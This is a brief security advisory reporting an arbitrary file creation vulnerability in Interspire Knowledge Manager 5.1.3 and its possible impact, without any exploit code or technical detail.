Interspire Knowledge Manager is prone to a vulnerability that allows attackers to create arbitrary files on a vulnerable computer.

An attacker may exploit this issue to create arbitrary files, which may then be executed to perform unauthorized actions. This may aid in further attacks.

Knowledge Manager 5.1.3 is vulnerable; other versions may also be affected.
